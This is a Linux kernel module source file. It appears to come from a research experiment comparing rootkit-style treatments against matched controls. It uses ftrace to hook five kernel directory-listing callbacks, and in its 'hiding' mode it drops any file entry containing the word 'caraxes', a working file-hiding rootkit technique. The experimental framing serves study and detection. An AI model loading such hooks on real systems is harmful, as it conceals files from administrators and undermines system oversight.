/*
 * Shared D7 causal-control implementation.
 *
 * KICBA_D7_MODE:
 *   0 = matched five-hook pass-through control
 *   1 = active-logic control (same filename test, never suppress)
 *   2 = hiding treatment (same filename test, suppress matching entry)
 *
 * Keeping the wrappers and counters in one source is intentional: the three
 * modules differ only at the treatment decision after a positive name match.
 */

#include <linux/atomic.h>
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/string.h>

#include "ftrace_helper.h"

#if !defined(KICBA_D7_MODE) || KICBA_D7_MODE < 0 || KICBA_D7_MODE > 2
#error "KICBA_D7_MODE must be 0 (pass), 1 (active), or 2 (hiding)"
#endif

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("KICBA D7 matched causal-control module");

static char *magic_word = "caraxes";
module_param(magic_word, charp, 0444);
MODULE_PARM_DESC(magic_word, "Directory-entry substring used by D7 controls");

/*
 * Counters are qualification instrumentation, not part of the treatment.
 * The hooks and hiding behaviour remain global, while reported counters are
 * restricted to the experiment's exec'd `ls` processes.  This prevents
 * unrelated directory walks elsewhere in the VM from invalidating the
 * callback-path equivalence check.
 */
static char *counter_comm = "ls";
module_param(counter_comm, charp, 0444);
MODULE_PARM_DESC(counter_comm, "Task comm included in D7 audit counters");

static int param_get_atomic64(char *buffer, const struct kernel_param *kp)
{
	atomic64_t *value = kp->arg;

	return sysfs_emit(buffer, "%lld\n",
			  (long long)atomic64_read(value));
}

static const struct kernel_param_ops atomic64_ro_ops = {
	.get = param_get_atomic64,
};

#define D7_COUNTER(_name) \
	static atomic64_t _name = ATOMIC64_INIT(0); \
	module_param_cb(_name, &atomic64_ro_ops, &_name, 0444)

D7_COUNTER(fillonedir_calls);
D7_COUNTER(filldir_calls);
D7_COUNTER(filldir64_calls);
D7_COUNTER(compat_fillonedir_calls);
D7_COUNTER(compat_filldir_calls);
D7_COUNTER(filter_checks);
D7_COUNTER(filter_matches);

static bool d7_count_this_task(void)
{
	return strcmp(current->comm, counter_comm) == 0;
}

static bool d7_match(const char *name, bool count)
{
#if KICBA_D7_MODE == 0
	return false;
#else
	bool matched;

	if (count)
		atomic64_inc(&filter_checks);
	matched = strstr(name, magic_word) != NULL;
	if (count && matched)
		atomic64_inc(&filter_matches);
	return matched;
#endif
}

static bool (*orig_fillonedir)(struct dir_context *ctx, const char *name,
			       int namlen, loff_t offset, u64 ino,
			       unsigned int d_type);

static bool d7_fillonedir(struct dir_context *ctx, const char *name, int namlen,
			  loff_t offset, u64 ino, unsigned int d_type)
{
	bool count = d7_count_this_task();

	if (count)
		atomic64_inc(&fillonedir_calls);
#if KICBA_D7_MODE == 2
	if (d7_match(name, count))
		return true;
#else
	d7_match(name, count);
#endif
	return orig_fillonedir(ctx, name, namlen, offset, ino, d_type);
}

static bool (*orig_filldir)(struct dir_context *ctx, const char *name,
			    int namlen, loff_t offset, u64 ino,
			    unsigned int d_type);

static bool d7_filldir(struct dir_context *ctx, const char *name, int namlen,
		       loff_t offset, u64 ino, unsigned int d_type)
{
	bool count = d7_count_this_task();

	if (count)
		atomic64_inc(&filldir_calls);
#if KICBA_D7_MODE == 2
	if (d7_match(name, count))
		return true;
#else
	d7_match(name, count);
#endif
	return orig_filldir(ctx, name, namlen, offset, ino, d_type);
}

static bool (*orig_filldir64)(struct dir_context *ctx, const char *name,
			      int namlen, loff_t offset, u64 ino,
			      unsigned int d_type);

static bool d7_filldir64(struct dir_context *ctx, const char *name, int namlen,
			 loff_t offset, u64 ino, unsigned int d_type)
{
	bool count = d7_count_this_task();

	if (count)
		atomic64_inc(&filldir64_calls);
#if KICBA_D7_MODE == 2
	if (d7_match(name, count))
		return true;
#else
	d7_match(name, count);
#endif
	return orig_filldir64(ctx, name, namlen, offset, ino, d_type);
}

static bool (*orig_compat_fillonedir)(struct dir_context *ctx,
				      const char *name, int namlen,
				      loff_t offset, u64 ino,
				      unsigned int d_type);

static bool d7_compat_fillonedir(struct dir_context *ctx, const char *name,
				 int namlen, loff_t offset, u64 ino,
				 unsigned int d_type)
{
	bool count = d7_count_this_task();

	if (count)
		atomic64_inc(&compat_fillonedir_calls);
#if KICBA_D7_MODE == 2
	if (d7_match(name, count))
		return true;
#else
	d7_match(name, count);
#endif
	return orig_compat_fillonedir(ctx, name, namlen, offset, ino, d_type);
}

static bool (*orig_compat_filldir)(struct dir_context *ctx, const char *name,
				   int namlen, loff_t offset, u64 ino,
				   unsigned int d_type);

static bool d7_compat_filldir(struct dir_context *ctx, const char *name,
			      int namlen, loff_t offset, u64 ino,
			      unsigned int d_type)
{
	bool count = d7_count_this_task();

	if (count)
		atomic64_inc(&compat_filldir_calls);
#if KICBA_D7_MODE == 2
	if (d7_match(name, count))
		return true;
#else
	d7_match(name, count);
#endif
	return orig_compat_filldir(ctx, name, namlen, offset, ino, d_type);
}

static struct ftrace_hook d7_hooks[] = {
	HOOK_NOSYS("fillonedir", d7_fillonedir, &orig_fillonedir),
	HOOK_NOSYS("filldir", d7_filldir, &orig_filldir),
	HOOK_NOSYS("filldir64", d7_filldir64, &orig_filldir64),
	HOOK_NOSYS("compat_fillonedir", d7_compat_fillonedir,
		   &orig_compat_fillonedir),
	HOOK_NOSYS("compat_filldir", d7_compat_filldir, &orig_compat_filldir),
};

static int __init d7_init(void)
{
	return fh_install_hooks(d7_hooks, ARRAY_SIZE(d7_hooks));
}

static void __exit d7_exit(void)
{
	fh_remove_hooks(d7_hooks, ARRAY_SIZE(d7_hooks));
}

module_init(d7_init);
module_exit(d7_exit);
